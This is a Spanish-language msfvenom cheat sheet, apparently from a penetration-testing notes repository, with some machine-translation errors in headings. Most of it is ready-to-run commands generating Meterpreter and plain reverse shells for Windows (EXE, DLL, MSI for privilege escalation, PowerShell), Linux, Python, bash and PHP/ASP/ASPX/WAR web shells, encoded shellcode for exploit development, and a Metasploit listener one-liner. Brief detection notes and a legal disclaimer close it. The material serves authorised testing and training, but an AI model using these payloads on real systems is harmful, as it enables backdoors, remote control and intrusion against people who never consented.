<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💣 Msfvenom - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
         Metasploit Standalone Payload Generator & Shellcode Encoder
```
<p align="centro">
  <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
  <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
  <img src="https://img.shields.io/badge/Category-Exploit_Payloads-green?style=for-the-badge" alt="Cargas útiles">
  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="Formatos">
</p>

<p align="centro">
  <b>💣 Hoja de trucos maestra para generar cargas útiles independientes, código shell y puertas traseras en plataformas Windows, Linux, macOS, Android y web</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y arquitectura de carga útil] (#-descripción general--arquitectura de carga útil)
  - [Cargas útiles en etapas versus sin etapas](#cargas útiles en etapas versus sin etapas)
- [Banderas y opciones esenciales](#-banderas-esenciales--opciones)
- [Cargas útiles de Windows (EXE, DLL, MSI, PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
- [Cargas útiles de Linux y Unix (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
- [Cargas útiles web y de shell web (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
- [Generación de Shellcode para el desarrollo de exploits (C, Raw, Python)](#-generación-shellcode-para-desarrollo-de-exploit-c-raw-python)
  - [Eliminar personajes malos (`-b`)](#eliminar-personajes-malos--b)
  - [Codificadores y iteraciones múltiples (`-e`, `-i`)](#codificadores--iteraciones-múltiples--e--i)
- [Configuración rápida de múltiples controladores de Metasploit] (#-metasploit-multi-handler-quick-setup)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y detección](#-consideraciones-defensivas--detección)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y arquitectura de carga útil

Combinando las utilidades clásicas `msfpayload` y `msfencode`, **msfvenom** genera ejecutables binarios, scripts y código shell sin formato para pruebas de explotación y penetración.

### Cargas útiles en etapas versus sin etapas
- **En etapas (por ejemplo, `windows/x64/meterpreter/reverse_tcp`):**
  Utiliza barras entre componentes. Un pequeño trozo (etapa 0) se conecta nuevamente con el oyente y recupera la DLL reflectante completa (etapa 1) en la memoria. Ideal para exploits con límites estrictos de longitud del búfer.
- **Sin etapas (por ejemplo, `windows/x64/meterpreter_reverse_tcp`):**
  Utiliza un guión bajo (`_`). Toda la carga útil de Meterpreter está contenida dentro del ejecutable o código shell. Funciona de manera confiable sin depender de protocolos de enlace de red de varias etapas, lo que lo hace ideal para corredores de línea de comando y persistencia evasiva.

---

## ⚙️ Banderas y opciones esenciales
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```
| Bandera | Descripción |
|------|-------------|
| `-p, --payload` | Especifica la carga útil que se utilizará (`--list payloads` para ver todo). |
| `-f, --format` | Formato de salida (exe, elf, raw, c, python, asp, aspx, war, php). |
| `-e, --encoder` | Codificador Shellcode para eliminar caracteres incorrectos (`--list encoders`). |
| `-i, --iterations` | Número de pases de codificación. |
| `-b, --bad-chars` | Caracteres que se deben evitar en el código shell (por ejemplo, `\x00\x0a\x0d`). |
| `-x, --template` | Plantilla ejecutable para inyectar carga útil. |
| `-k, --keep` | Conserva la ejecución normal de la plantilla en un nuevo hilo. |
| `-o, --out` | Ruta del archivo de destino de salida. |

---

## 🪟 Cargas útiles de Windows (EXE, DLL, MSI, PowerShell)

### Ejecutable de shell inverso de Windows x64 (sin etapas)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```
### Ejecutable TCP inverso por etapas de Windows x64
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
```
### Carga útil de inyección de DLL de Windows
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
```
### Instalador MSI de Windows (escalada de privilegios a través de AlwaysInstallElevated)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
```
### Comando PowerShell codificado en Base64
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
```
---

## 🐧 Cargas útiles de Linux y Unix (ELF, Python, Bash)

### Linux x64 ELF binario (sin etapas)
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```
### Estándar de Linux `/bin/sh` TCP inverso (sin Meterpreter)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
```
### Script de shell inverso de Python independiente
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```
### Cadena de comando Pure Bash
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```
---

## 🌐 Cargas útiles web y de shell web (PHP, ASP, ASPX, JSP, WAR)

### Shell de PHP Meterpreter inverso
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```
### ASP y ASPX clásicos (servidores IIS)
```bash
# Classic ASP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Modern ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```
### Paquete Java WAR (archivo web Apache Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
```
---

## 🔬 Generación de Shellcode para desarrollo de exploits (C, Raw, Python)

### Eliminando personajes malos (`-b`)
Los bytes nulos (`\x00`), los retornos de carro (`\r` = `\x0d`) y las nuevas líneas (`\n` = `\x0a`) rompen los exploits de corrupción de memoria basados en cadenas (por ejemplo, desbordamientos de pila):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -o shellcode.c
```
### Codificadores y múltiples iteraciones (`-e`, `-i`)
```bash
# Polymorphic XOR additive feedback encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
```
---

## 🎧 Configuración rápida de múltiples controladores de Metasploit

Capture siempre cargas útiles utilizando `multi/handler` de Metasploit:
```bash
# One-liner handler startup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```
---

## ⚡ Tabla de referencia rápida

| Plataforma de destino | Comando |
|-----------------|-----------------|
| **Windows x64 EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
| **Linux x64 ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
| **Shell web PHP** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
| **ASPX (.NET IIS)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
| **GUERRA de Tomcat** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
| **Código Shell sin formato (C)**| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
| **PowerShell de una sola línea**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |

---

## 🛡️ Consideraciones defensivas y detección

1. **Detección de firmas estáticas:** Las plantillas y codificadores predeterminados de Msfvenom (`shikata_ga_nai`) tienen firmas estáticas bien conocidas identificadas por prácticamente todos los motores antivirus modernos.
2. **Monitoreo de comportamiento de EDR:** Los agentes de EDR señalan la generación de procesos anormales (por ejemplo, `cmd.exe` o `powershell.exe` generados bajo `w3wp.exe` o `tomcat8.exe`).

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> Msfvenom genera cargas útiles ofensivas funcionales y puertas traseras. Debe utilizarse estrictamente durante las pruebas de penetración autorizadas y en entornos de investigación de laboratorio aislados. La generación o ejecución no autorizada en computadoras de terceros es ilegal.